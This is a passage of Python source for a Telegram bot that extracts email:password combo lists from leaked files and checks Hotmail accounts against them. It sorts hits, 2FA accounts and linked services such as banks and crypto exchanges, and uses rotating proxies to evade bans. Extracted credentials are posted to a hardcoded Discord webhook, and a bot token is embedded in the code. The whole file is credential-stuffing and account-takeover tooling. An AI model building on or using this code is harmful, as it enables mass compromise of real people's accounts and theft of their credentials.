import asyncio
import os
import re
import time
import sqlite3
import json
import random
import threading
from datetime import datetime, timedelta
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, Message

try:
    import aiohttp
    from aiohttp import DummyCookieJar, TCPConnector
except ImportError:
    print("[FATAL] aiohttp not installed! Run: pip install aiohttp")
    raise

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    urllib3 = None

try:
    from flask import Flask, jsonify
except ImportError:
    print("[FATAL] Flask not installed! Run: pip install flask")
    raise

# ═══════════════════════════════════════════════════════════
# CONFIGURATION (Load from env or use defaults)
# ═══════════════════════════════════════════════════════════
API_TOKEN = os.environ.get("BOT_TOKEN", "8814848831:AAEo3Ui19kB30X93-Cuzugzoi4rdfvpwCjw")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "8703458182"))
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "lxhds")
CHANNEL_USERNAME = os.environ.get("CHANNEL_USERNAME", "lsueusuds")
CHANNEL_URL = os.environ.get("CHANNEL_URL", "https://t.me/lsueusuds")
DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "https://discord.com/api/webhooks/1544679115054129282/9BRgzgVo7ipiW6rhxfaECuQDl9vytlVg0ZojCt0_NuLNgMjIh0kDda1EhyVPNvooi5CO")

bot = AsyncTeleBot(API_TOKEN)

# ═══════════════════════════════════════════════════════════
# FLASK APP (Main process for Render)
# ═══════════════════════════════════════════════════════════
app = Flask(__name__)

@app.route('/')
def index():
    return jsonify({"status": "running", "bot": "Combo Bot Pro", "timestamp": datetime.now().isoformat()})

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

@app.route('/stats')
def stats():
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
        total_vips = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM hotmail_checks")
        total_checks = cursor.fetchone()[0]
        cursor.execute("SELECT SUM(hits) FROM hotmail_checks")
        total_hits = cursor.fetchone()[0] or 0
        conn.close()
        return jsonify({"total_users": total_users, "total_vips": total_vips, "total_checks": total_checks, "total_hits": total_hits})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    print(f"[*] Flask server starting on port {port}...")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False, threaded=True)

# ═══════════════════════════════════════════════════════════
# EMOJI
# ═══════════════════════════════════════════════════════════
EMOJI = {
    "yes": "✨", "fire": "🔥", "no": "💀", "lightning": "⚡",
    "card": "💫", "circle": "🌀", "target": "🎯", "bot": "😼",
    "admin": "🧠", "box": "🎀", "rocket": "🎉", "warning": "⚠️",
    "diamond": "💎", "crown": "👑", "shield": "🛡️", "search": "🔍",
    "chart": "📊", "mail": "📧", "key": "🔑", "link": "🔗",
    "globe": "🌐", "star": "⭐", "trophy": "🏆", "zap": "⚡",
    "lock": "🔒", "unlock": "🔓", "check": "✅", "cross": "❌",
    "timer": "⏱️", "hourglass": "⏳", "gear": "⚙️", "mag": "🔎",
    "label": "🏷️", "package": "📦", "flame": "🔥", "ghost": "👻",
    "alien": "👽", "robot": "🤖", "game": "🎮", "controller": "🎮",
    "phone": "📱", "computer": "💻", "cloud": "☁️", "database": "🗄️",
    "satellite": "📡", "radar": "📡", "telescope": "🔭", "microscope": "🔬",
    "dna": "🧬", "brain": "🧠", "heart": "❤️", "pulse": "💓",
    "medicine": "💊", "syringe": "💉", "bandage": "🩹", "stethoscope": "🩺",
    "thermometer": "🌡️", "mask": "😷", "gloves": "🧤", "soap": "🧼",
    "broom": "🧹", "bucket": "🪣", "sponge": "🧽", "toilet": "🚽",
    "shower": "🚿", "bathtub": "🛁", "razor": "🪒", "lotion": "🧴",
    "nail_care": "💅", "barber": "💈", "ballet": "🩰", "athletic": "🥋",
    "trophy2": "🏆", "medal": "🏅", "military": "🎖️", "crown2": "👑",
    "jewel": "💎", "ring": "💍", "gem": "💎", "proxy": "🌐",
    "speed": "🚀", "network": "📡",
}

# ═══════════════════════════════════════════════════════════
# LANGUAGES
# ═══════════════════════════════════════════════════════════
LANGS = {
    "ar": {
        "sub_required": f"{EMOJI['warning']} يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!\n\n📌 القناة:",
        "sub_button": "📢 اشترك في القناة الآن",
        "check_sub": "تحقق من الاشتراك",
        "welcome": f"{EMOJI['bot']} <b>أهلاً بك في بوت استخراج الكومبو النقي والفحص الذكي!</b>\n\n{EMOJI['rocket']} <b>للبدء، قم ببساطة بإرسال (رابط الملف المباشر) هنا:</b>\n\n{EMOJI['flame']} <b>أو اختر أحد الخيارات أدناه:</b>",
        "vip_active": f"متبقي على اشتراكك: ",
        "vip_buy": "اشتراك VIP (شحن بريميوم)",
        "lang_btn": "Language: English",
        "admin_panel_btn": "لوحة تحكم الأدمن (Admin Panel)",
        "hotmail_btn": "🔥 فحص Hotmail Combo",
        "link_info_title": f"{EMOJI['target']} <b>تم فحص الرابط بنجاح:</b>\n\n{EMOJI['box']} <b>اسم الملف:</b> `{{filename}}`\n{EMOJI['card']} <b>الحجم الحقيقي:</b> `{{filesize}}`\n\n<b>اختر العملية المطلوبة:</b>",
        "combo_btn": "📦 استخراج كومبو نقي ULP (Email:Pass)",
        "cancel_btn": "❌ إلغاء",
        "free_exhausted": f"{EMOJI['warning']} لقد استهلكت محاولاتك المجانية (3 محاولات) لهذا اليوم!",
        "upgrade_vip": "💎 ترقية حسابك إلى VIP",
        "sub_not_yet": "لم تقم بالاشتراك بعد!",
        "sub_success": "تم التحقق بنجاح!",
        "lang_changed": "تم تغيير اللغة بنجاح إلى العربية",
        "error_download": "فشل التحميل أو الرابط غير صالح، كود الاستجابة: ",
        "invalid_link": f"{EMOJI['no']} الرابط لا يحتوي على ملف صالح أو أن السيرفر لا يستجيب بشكل صحيح.",
        "processing_panel": f"{EMOJI['circle']} <b>جاري تفريق البيانات واستخراج الكومبو (ULP)...</b>\n⏳ <b>يرجى الانتظار.</b>",
        "download_started_2": f"{EMOJI['rocket']} <b>لوحة التصفية الذكية:</b>\n\n",
        "cancel_process": "🛑 إيقاف التحميل",
        "process_cancelled": f"{EMOJI['no']} تم إلغاء العملية بناءً على طلبك.",
        "password_prompt": f"{EMOJI['card']} <b>الملف محمي بكلمة سر!</b>\n\n<b>يرجى إرسال كلمة المرور في الرسالة القادمة، أو اضغط إلغاء:</b>",
        "no_results": f"{EMOJI['no']} لم يتم العثور على بيانات مطابقة للصيغة المطلوبة.",
        "success_results": f"{EMOJI['yes']} تمت العملية بنجاح! تم استخراج {{count}} نتيجة في غضون {{elapsed:.2f}} ثانية.{{remaining}}",
        "remaining_tries": " (متبقي لديك {free} محاولات مجانية اليوم)",
        "unlimited_vip": f" (حساب VIP غير محدود {EMOJI['diamond']})",
        "error_processing": f"{EMOJI['no']} حدث خطأ أثناء المعالجة: ",
        "discord_sent": f"{EMOJI['yes']} تم إرسال الملف إلى Discord بنجاح!",
        "discord_failed": f"{EMOJI['warning']} فشل إرسال الملف إلى Discord.",
        "hotmail_welcome": f"{EMOJI['flame']} <b>فاحص Hotmail الذكي</b>\n\nأرسل ملف الكومبو (.txt) مباشرة هنا،\nأو اضغط على الزر أدناه لفحص آخر ملف ULP تم استخراجه.",
        "hotmail_check_file_btn": "🔥 فحص آخر ملف ULP تلقائياً",
        "hotmail_send_file_btn": "📎 إرسال ملف Combo جديد",
        "hotmail_processing": f"{EMOJI['flame']} <b>جاري الفحص الذكي لحسابات Hotmail...</b>\n⏳ <b>يرجى الانتظار، قد يستغرق الأمر بضع دقائق.</b>",
        "hotmail_progress": f"{EMOJI['flame']} <b>تقدم الفحص الذكي:</b>\n\n{{bar}}\n\n{EMOJI['check']} <b>صحيحة (Hits):</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>مخصصة (Custom):</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>فاشلة:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>إعادة المحاولة:</b> <code>{{retries}}</code>\n\n{EMOJI['timer']} <b>السرعة:</b> <code>{{speed:.1f}}</code> حساب/ثانية\n{EMOJI['hourglass']} <b>المنصات المكتشفة:</b> <code>{{platforms}}</code>\n{EMOJI['proxy']} <b>البروكسيات النشطة:</b> <code>{{proxies}}</code>",
        "hotmail_done": f"{EMOJI['trophy']} <b>اكتمل الفحص الذكي!</b>\n\n{EMOJI['check']} <b>صحيحة:</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>مخصصة:</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>فاشلة:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>إعادة المحاولة:</b> <code>{{retries}}</code>\n{EMOJI['chart']} <b>المجموع:</b> <code>{{total}}</code>\n{EMOJI['timer']} <b>المدة:</b> <code>{{elapsed:.1f}}s</code>",
        "hotmail_no_hits": f"{EMOJI['ghost']} لم يتم العثور على أي Hits.",
        "hotmail_auto_btn": "🔥 فحص Hotmail تلقائي لهذا الملف",
        "hotmail_cancel": "🛑 إيقاف الفحص",
        "hotmail_stopped": f"{EMOJI['no']} تم إيقاف الفحص بنجاح.",
        "hotmail_no_file": f"{EMOJI['warning']} لا يوجد ملف ULP سابق. يرجى استخراج كومبو أولاً أو إرسال ملف مباشرة.",
        "hotmail_file_received": f"{EMOJI['package']} <b>تم استلام الملف:</b> <code>{{filename}}</code>\n{EMOJI['chart']} <b>السطور:</b> <code>{{lines}}</code>\n\n{EMOJI['flame']} <b>اضغط الزر أدناه لبدء الفحص الذكي:</b>",
        "hotmail_start_btn": "🚀 ابدأ الفحص الذكي",
        "proxy_menu_btn": "🌐 إدارة البروكسيات",
        "proxy_welcome": f"{EMOJI['proxy']} <b>إدارة البروكسيات</b>\n\nأرسل ملف (ملفات) البروكسيات بصيغة .txt\n<b>الصيغة المدعومة:</b> <code>ip:port</code> أو <code>http://ip:port</code>\n\n{EMOJI['speed']} <b>البروكسيات المحملة:</b> <code>{{count}}</code>",
        "proxy_file_received": f"{EMOJI['yes']} <b>تم استلام ملف البروكسيات:</b> <code>{{filename}}</code>\n{EMOJI['check']} <b>بروكسيات صالحة:</b> <code>{{count}}</code>",
        "proxy_no_proxies": f"{EMOJI['warning']} لا يوجد بروكسيات محملة. سيتم استخدام الاتصال المباشر (أبطأ وقد يؤدي للحظر).",
        "proxy_add_btn": "📎 إرسال ملف بروكسيات جديد",
        "proxy_clear_btn": "🗑️ مسح جميع البروكسيات",
        "proxy_cleared": f"{EMOJI['yes']} تم مسح جميع البروكسيات بنجاح.",
    },
    "en": {
        "sub_required": f"{EMOJI['warning']} You must subscribe to the bot channel first to use it!\n\n📌 Channel:",
        "sub_button": "📢 Subscribe to Channel",
        "check_sub": "Check Subscription",
        "welcome": f"{EMOJI['bot']} <b>Welcome to the Clean Combo & Smart Checker Bot!</b>\n\n{EMOJI['rocket']} <b>To start, send a direct file link here:</b>\n\n{EMOJI['flame']} <b>Or choose an option below:</b>",
        "vip_active": "VIP Time Left: ",
        "vip_buy": "VIP Subscription (Get Premium)",
        "lang_btn": "اللغة: العربية",
        "admin_panel_btn": "Admin Panel",
        "hotmail_btn": "🔥 Hotmail Combo Checker",
        "link_info_title": f"{EMOJI['target']} <b>Link Inspected Successfully:</b>\n\n{EMOJI['box']} <b>File Name:</b> `{{filename}}`\n{EMOJI['card']} <b>Real Size:</b> `{{filesize}}`\n\n<b>Choose operation:</b>",
        "combo_btn": "📦 Extract Clean ULP Combo (Email:Pass)",
        "cancel_btn": "❌ Cancel",
        "free_exhausted": f"{EMOJI['warning']} You have exhausted your daily free trials!",
        "upgrade_vip": "💎 Upgrade to VIP",
        "sub_not_yet": "You haven't subscribed yet!",
        "sub_success": "Verified successfully!",
        "lang_changed": "Language changed successfully to English",
        "error_download": "Download failed or invalid link, status code: ",
        "invalid_link": f"{EMOJI['no']} The link does not contain a valid file or the server is unresponsive.",
        "processing_panel": f"{EMOJI['circle']} <b>Processing and filtering combo data precisely...</b>\n⏳ <b>Please wait.</b>",
        "download_started_2": f"{EMOJI['rocket']} <b>Smart Filtering Dashboard:</b>\n\n",
        "cancel_process": "🛑 Stop Download",
        "process_cancelled": f"{EMOJI['no']} Process cancelled by user.",
        "password_prompt": f"{EMOJI['card']} <b>The file is password protected!</b>\n\n<b>Please send the password in the next message, or cancel:</b>",
        "no_results": f"{EMOJI['no']} No matching data found.",
        "success_results": f"{EMOJI['yes']} Operation successful! Extracted {{count}} lines in {{elapsed:.2f}}s.{{remaining}}",
        "remaining_tries": " ({free} free tries remaining today)",
        "unlimited_vip": f" (Unlimited VIP Account {EMOJI['diamond']})",
        "error_processing": f"{EMOJI['no']} An error occurred: ",
        "discord_sent": f"{EMOJI['yes']} File sent to Discord successfully!",
        "discord_failed": f"{EMOJI['warning']} Failed to send file to Discord.",
        "hotmail_welcome": f"{EMOJI['flame']} <b>Smart Hotmail Checker</b>\n\nSend a combo file (.txt) directly here,\nOr click below to auto-check last ULP file.",
        "hotmail_check_file_btn": "🔥 Auto-Check Last ULP File",
        "hotmail_send_file_btn": "📎 Send New Combo File",
        "hotmail_processing": f"{EMOJI['flame']} <b>Smart Hotmail checking in progress...</b>\n⏳ <b>Please wait, this may take a few minutes.</b>",
        "hotmail_progress": f"{EMOJI['flame']} <b>Smart Check Progress:</b>\n\n{{bar}}\n\n{EMOJI['check']} <b>Hits:</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>Custom:</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>Bad:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>Retries:</b> <code>{{retries}}</code>\n\n{EMOJI['timer']} <b>Speed:</b> <code>{{speed:.1f}}</code> acc/sec\n{EMOJI['hourglass']} <b>Platforms Found:</b> <code>{{platforms}}</code>\n{EMOJI['proxy']} <b>Active Proxies:</b> <code>{{proxies}}</code>",
        "hotmail_done": f"{EMOJI['trophy']} <b>Smart Check Complete!</b>\n\n{EMOJI['check']} <b>Hits:</b> <code>{{hits}}</code>\n{EMOJI['lock']} <b>2FA:</b> <code>{{twofactor}}</code>\n{EMOJI['shield']} <b>Custom:</b> <code>{{custom}}</code>\n{EMOJI['cross']} <b>Bad:</b> <code>{{bad}}</code>\n{EMOJI['zap']} <b>Retries:</b> <code>{{retries}}</code>\n{EMOJI['chart']} <b>Total:</b> <code>{{total}}</code>\n{EMOJI['timer']} <b>Duration:</b> <code>{{elapsed:.1f}}s</code>",
        "hotmail_no_hits": f"{EMOJI['ghost']} No Hits found.",
        "hotmail_auto_btn": "🔥 Auto Hotmail Check This File",
        "hotmail_cancel": "🛑 Stop Checking",
        "hotmail_stopped": f"{EMOJI['no']} Checking stopped successfully.",
        "hotmail_no_file": f"{EMOJI['warning']} No previous ULP file found. Please extract a combo first or send a file directly.",
        "hotmail_file_received": f"{EMOJI['package']} <b>File Received:</b> <code>{{filename}}</code>\n{EMOJI['chart']} <b>Lines:</b> <code>{{lines}}</code>\n\n{EMOJI['flame']} <b>Click below to start smart check:</b>",
        "hotmail_start_btn": "🚀 Start Smart Check",
        "proxy_menu_btn": "🌐 Proxy Manager",
        "proxy_welcome": f"{EMOJI['proxy']} <b>Proxy Manager</b>\n\nSend proxy file(s) in .txt format\n<b>Supported format:</b> <code>ip:port</code> or <code>http://ip:port</code>\n\n{EMOJI['speed']} <b>Loaded Proxies:</b> <code>{{count}}</code>",
        "proxy_file_received": f"{EMOJI['yes']} <b>Proxy file received:</b> <code>{{filename}}</code>\n{EMOJI['check']} <b>Valid proxies:</b> <code>{{count}}</code>",
        "proxy_no_proxies": f"{EMOJI['warning']} No proxies loaded. Will use direct connection (slower and may cause bans).",
        "proxy_add_btn": "📎 Send New Proxy File",
        "proxy_clear_btn": "🗑️ Clear All Proxies",
        "proxy_cleared": f"{EMOJI['yes']} All proxies cleared successfully.",
    }
}

# ═══════════════════════════════════════════════════════════
# SERVICES DATABASE - 60+ PLATFORMS
# ═══════════════════════════════════════════════════════════
SV = {
    "noreply@id.supercell.com": "Supercell",
    "security@mail.instagram.com": "Instagram",
    "security@facebookmail.com": "Facebook",
    "register@account.tiktok.com": "TikTok",
    "info@x.com": "X (Twitter)",
    "info@account.netflix.com": "Netflix",
    "noreply@crunchyroll.com": "Crunchyroll",
    "noreply@steampowered.com": "Steam",
    "xboxreps@engage.xbox.com": "Xbox",
    "help@acct.epicgames.com": "Epic Games",
    "noreply@accts.krafton.com": "PUBG Mobile",
    "yallaludo_account@support.yalla.live": "YALLA LUDO",
    "service@mail.yallapay.live": "YALLA PAY",
    "noreply@playstation.com": "PlayStation",
    "noreply@nintendo.com": "Nintendo",
    "noreply@blizzard.com": "Blizzard",
    "noreply@riotgames.com": "Riot Games",
    "noreply@ea.com": "EA Games",
    "account@ubi.com": "Ubisoft",
    "noreply@roblox.com": "Roblox",
    "noreply@activision.com": "Activision",
    "noreply@bungie.net": "Bungie",
    "noreply@mihoyo.com": "HoYoverse",
    "noreply@hoyoverse.com": "HoYoverse",
    "genshinimpact.com": "Genshin Impact",
    "honkaistarrail.com": "Honkai Star Rail",
    "zenlesszonezero.com": "Zenless Zone Zero",
    "noreply@bluearchive.jp": "Blue Archive",
    "noreply@fate-go.us": "Fate/GO",
    "noreply@pathofexile.com": "Path of Exile",
    "noreply@diablo.com": "Diablo",
    "noreply@worldofwarcraft.com": "World of Warcraft",
    "noreply@finalfantasyxiv.com": "Final Fantasy XIV",
    "noreply@guildwars2.com": "Guild Wars 2",
    "noreply@elderscrollsonline.com": "ESO",
    "noreply@blackdesertonline.com": "Black Desert",
    "noreply@lostark.com": "Lost Ark",
    "noreply@newworld.com": "New World",
    "noreply@runescape.com": "RuneScape",
    "noreply@albiononline.com": "Albion Online",
    "noreply@eveonline.com": "EVE Online",
    "noreply@nianticlabs.com": "Niantic",
    "noreply@pokemongo.com": "Pokemon GO",
    "noreply@ingress.com": "Ingress",
    "no-reply@accounts.google.com": "Google",
    "noreply@apple.com": "Apple",
    "noreply@snapchat.com": "Snapchat",
    "noreply@discord.com": "Discord",
    "noreply@pinterest.com": "Pinterest",
    "noreply@reddit.com": "Reddit",
    "noreply@tumblr.com": "Tumblr",
    "noreply@linkedin.com": "LinkedIn",
    "noreply@telegram.org": "Telegram",
    "noreply@whatsapp.com": "WhatsApp",
    "noreply@skype.com": "Skype",
    "noreply@spotify.com": "Spotify",
    "noreply@disneyplus.com": "Disney+",
    "noreply@hulu.com": "Hulu",
    "noreply@max.com": "HBO Max",
    "noreply@primevideo.com": "Prime Video",
    "noreply@twitch.tv": "Twitch",
    "noreply@youtube.com": "YouTube",
    "noreply@funimation.com": "Funimation",
    "noreply@vrv.co": "VRV",
    "noreply@github.com": "GitHub",
    "noreply@dropbox.com": "Dropbox",
    "noreply@adobe.com": "Adobe",
    "noreply@canva.com": "Canva",
    "noreply@zoom.us": "Zoom",
    "noreply@microsoft.com": "Microsoft",
    "noreply@office.com": "Microsoft Office",
    "noreply@onedrive.com": "OneDrive",
    "noreply@aws.amazon.com": "AWS",
    "noreply@cloudflare.com": "Cloudflare",
    "noreply@namecheap.com": "Namecheap",
    "noreply@godaddy.com": "GoDaddy",
    "noreply@hostinger.com": "Hostinger",
    "noreply@bluehost.com": "Bluehost",
    "noreply@shopify.com": "Shopify",
    "account@amazon.com": "Amazon",
    "service@paypal.com": "PayPal",
    "noreply@ebay.com": "eBay",
    "noreply@aliexpress.com": "AliExpress",
    "noreply@etsy.com": "Etsy",
    "noreply@binance.com": "Binance",
    "noreply@coinbase.com": "Coinbase",
    "noreply@kraken.com": "Kraken",
    "noreply@crypto.com": "Crypto.com",
    "noreply@blockchain.com": "Blockchain",
    "noreply@metamask.io": "MetaMask",
    "noreply@opensea.io": "OpenSea",
    "noreply@wise.com": "Wise",
    "noreply@revolut.com": "Revolut",
    "noreply@venmo.com": "Venmo",
    "noreply@cash.app": "Cash App",
    "noreply@westernunion.com": "Western Union",
    "noreply@openai.com": "ChatGPT/OpenAI",
    "noreply@anthropic.com": "Claude/Anthropic",
    "noreply@midjourney.com": "Midjourney",
    "noreply@stability.ai": "Stable Diffusion",
    "noreply@airbnb.com": "Airbnb",
    "noreply@booking.com": "Booking.com",
    "noreply@expedia.com": "Expedia",
    "noreply@uber.com": "Uber",
    "noreply@lyft.com": "Lyft",
    "noreply@chase.com": "Chase",
    "noreply@bankofamerica.com": "Bank of America",
    "noreply@wellsfargo.com": "Wells Fargo",
    "noreply@citi.com": "Citi",
    "noreply@amex.com": "Amex",
}

# ═══════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════
user_states = {}
admin_states = {}
active_downloads = {}
active_checks = {}
DB_FILE = "database.db"
PROXIES_DIR = "proxies"

VALID_USER_FIELDS = {
    "username", "lang", "is_vip", "vip_expiry", "banned",
    "free_uses", "last_reset", "last_extracted_file"
}

def init_db():
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            username TEXT,
            lang TEXT DEFAULT NULL,
            is_vip INTEGER DEFAULT 0,
            vip_expiry TEXT,
            banned INTEGER DEFAULT 0,
            free_uses INTEGER DEFAULT 3,
            last_reset TEXT,
            last_extracted_file TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS hotmail_checks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            filename TEXT,
            status TEXT,
            hits INTEGER DEFAULT 0,
            twofactor INTEGER DEFAULT 0,
            custom INTEGER DEFAULT 0,
            bad INTEGER DEFAULT 0,
            total INTEGER DEFAULT 0,
            platforms TEXT,
            created_at TEXT,
            completed_at TEXT
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS user_proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            file_path TEXT,
            created_at TEXT
        )
    """)
    conn.commit()
    conn.close()
    if not os.path.exists(PROXIES_DIR):
        os.makedirs(PROXIES_DIR)

init_db()

def get_user_by_id_or_username(identifier):
    identifier = str(identifier).strip().replace("@", "").lower()
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    if identifier.isdigit():
        cursor.execute("SELECT chat_id FROM users WHERE chat_id = ?", (int(identifier),))
    else:
        cursor.execute("SELECT chat_id FROM users WHERE LOWER(username) = ?", (identifier,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else None

def get_user(chat_id, username=None):
    chat_id = int(chat_id)
    today_str = str(datetime.now().date())
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT chat_id, username, lang, is_vip, vip_expiry, banned, free_uses, last_reset, last_extracted_file FROM users WHERE chat_id = ?", (chat_id,))
    row = cursor.fetchone()

    if not row:
        cursor.execute("""
            INSERT INTO users (chat_id, username, lang, is_vip, vip_expiry, banned, free_uses, last_reset, last_extracted_file)
            VALUES (?, ?, NULL, 0, NULL, 0, 3, ?, NULL)
        """, (chat_id, username, today_str))
        conn.commit()
        cursor.execute("SELECT chat_id, username, lang, is_vip, vip_expiry, banned, free_uses, last_reset, last_extracted_file FROM users WHERE chat_id = ?", (chat_id,))
        row = cursor.fetchone()

    db_chat_id, db_username, db_lang, db_is_vip, db_vip_expiry, db_banned, db_free_uses, db_last_reset, db_last_file = row

    if username and username != db_username:
        cursor.execute("UPDATE users SET username = ? WHERE chat_id = ?", (username, chat_id))
        conn.commit()
        db_username = username

    if db_last_reset != today_str:
        cursor.execute("UPDATE users SET free_uses = 3, last_reset = ? WHERE chat_id = ?", (today_str, chat_id))
        conn.commit()
        db_free_uses = 3

    is_vip_bool = bool(db_is_vip)
    vip_expiry_dt = datetime.fromisoformat(db_vip_expiry) if db_vip_expiry else None

    if is_vip_bool and vip_expiry_dt and datetime.now() > vip_expiry_dt:
        cursor.execute("UPDATE users SET is_vip = 0, vip_expiry = NULL WHERE chat_id = ?", (chat_id,))
        conn.commit()
        is_vip_bool = False
        vip_expiry_dt = None

    conn.close()
    return {
        "chat_id": db_chat_id, "username": db_username, "lang": db_lang,
        "is_vip": is_vip_bool, "vip_expiry": vip_expiry_dt, "banned": bool(db_banned), 
        "free_uses": db_free_uses, "last_extracted_file": db_last_file
    }

def update_user_field(chat_id, field, value):
    if field not in VALID_USER_FIELDS:
        print(f"[!] Invalid field update attempt: {field}")
        return
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute(f"UPDATE users SET {field} = ? WHERE chat_id = ?", (value, chat_id))
    conn.commit()
    conn.close()

def log_hotmail_check(chat_id, filename, status, hits=0, twofactor=0, custom=0, bad=0, total=0, platforms=""):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute("""
        INSERT INTO hotmail_checks (chat_id, filename, status, hits, twofactor, custom, bad, total, platforms, created_at, completed_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (chat_id, filename, status, hits, twofactor, custom, bad, total, platforms, now, now if status == "completed" else None))
    conn.commit()
    conn.close()

def save_proxy_file(chat_id, file_path):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    now = datetime.now().isoformat()
    cursor.execute("INSERT INTO user_proxies (chat_id, file_path, created_at) VALUES (?, ?, ?)",
                   (chat_id, file_path, now))
    conn.commit()
    conn.close()

def get_user_proxy_files(chat_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT file_path FROM user_proxies WHERE chat_id = ?", (chat_id,))
    rows = cursor.fetchall()
    conn.close()
    return [row[0] for row in rows if os.path.exists(row[0])]

def clear_user_proxies(chat_id):
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    cursor.execute("SELECT file_path FROM user_proxies WHERE chat_id = ?", (chat_id,))
    rows = cursor.fetchall()
    for row in rows:
        try:
            if os.path.exists(row[0]):
                os.remove(row[0])
        except:
            pass
    cursor.execute("DELETE FROM user_proxies WHERE chat_id = ?", (chat_id,))
    conn.commit()
    conn.close()

def count_user_proxies(chat_id):
    files = get_user_proxy_files(chat_id)
    count = 0
    for fp in files:
        try:
            with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        count += 1
        except:
            pass
    return count

# ═══════════════════════════════════════════════════════════
# PROXY MANAGER - Smart Proxy Rotation & Dead Removal
# ═══════════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self, chat_id=None):
        self.chat_id = chat_id
        self.proxies = []
        self.dead_proxies = set()
        self.lock = asyncio.Lock()
        self.load_proxies()

    def load_proxies(self):
        self.proxies = []
        files_to_load = []
        if self.chat_id:
            files_to_load = get_user_proxy_files(self.chat_id)
        if os.path.exists(PROXIES_DIR):
            for f in os.listdir(PROXIES_DIR):
                if f.endswith('.txt'):
                    files_to_load.append(os.path.join(PROXIES_DIR, f))
        for fp in set(files_to_load):
            if not os.path.exists(fp):
                continue
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        proxy = self._normalize_proxy(line)
                        if proxy:
                            self.proxies.append(proxy)
            except Exception as e:
                print(f"[!] Error loading proxy file {fp}: {e}")
        seen = set()
        unique = []
        for p in self.proxies:
            if p not in seen:
                seen.add(p)
                unique.append(p)
        self.proxies = unique
        print(f"[*] Loaded {len(self.proxies)} unique proxies | Alive: {len(self.proxies) - len(self.dead_proxies)}")

    def _normalize_proxy(self, proxy_str):
        proxy_str = proxy_str.strip()
        if not proxy_str:
            return None
        if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            return proxy_str
        if ':' in proxy_str and not proxy_str.startswith('http'):
            if '@' in proxy_str:
                return f"http://{proxy_str}"
            else:
                return f"http://{proxy_str}"
        return None

    async def get_proxy(self):
        async with self.lock:
            available = [p for p in self.proxies if p not in self.dead_proxies]
            if not available:
                return None
            proxy = random.choice(available)
            print(f"[PROXY] Using: {proxy[:40]}...")
            return proxy

    async def mark_dead(self, proxy):
        async with self.lock:
            if proxy not in self.dead_proxies:
                self.dead_proxies.add(proxy)
                alive = len(self.proxies) - len(self.dead_proxies)
                print(f"[!] Proxy DEAD: {proxy[:40]}... | Alive remaining: {alive}")

    async def get_alive_count(self):
        async with self.lock:
            return len(self.proxies) - len(self.dead_proxies)

    def has_proxies(self):
        return len(self.proxies) > 0

# ═══════════════════════════════════════════════════════════
# DISCORD WEBHOOK
# ═══════════════════════════════════════════════════════════
async def send_file_to_discord(file_path, filename, target_info, count, user_info="Unknown", embed_title="New Combo Extracted", color=0x5865F2):
    if not DISCORD_WEBHOOK_URL or "XXXXXXXX" in DISCORD_WEBHOOK_URL:
        print("[!] Discord Webhook URL not configured!")
        return False
    try:
        timestamp = datetime.utcnow().isoformat()
        embed = {
            "title": embed_title,
            "color": color,
            "fields": [
                {"name": "Target", "value": f"`{target_info}`", "inline": True},
                {"name": "Count", "value": f"`{count}`", "inline": True},
                {"name": "User", "value": f"`{user_info}`", "inline": True},
                {"name": "Time", "value": f"`{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`", "inline": True}
